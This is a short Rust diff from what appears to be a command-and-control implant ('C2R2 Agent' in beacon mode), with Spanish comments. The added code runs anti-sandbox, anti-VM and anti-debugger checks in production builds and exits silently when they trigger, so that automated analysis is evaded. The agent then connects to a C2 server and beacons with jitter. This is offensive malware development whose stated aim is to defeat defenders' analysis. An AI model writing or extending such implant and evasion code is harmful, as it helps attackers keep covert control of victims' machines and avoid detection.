@@ -36,6 +36,21 @@ const DELIMITER: &str = "\n<<END>>\n";
 
 fn main() {
     debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
+    
+    // ============================================================================
+    // ANTI-SANDBOX CHECKS (Production Mode Only)
+    // ============================================================================
+    // In production mode, perform comprehensive anti-analysis checks
+    // If sandbox/VM/debugger is detected, exit silently to evade analysis
+    #[cfg(feature = "production")]
+    {
+        if evasion::run_anti_sandbox_checks() {
+            // Sandbox detected - exit silently without any indication
+            // This prevents analysis in automated sandbox environments
+            std::process::exit(0);
+        }
+    }
+    
     debug_print!("DEBUG: Conectando a {}", config::C2_SERVER);
     
     // Configuración de beacon (60s con 30% jitter por defecto)
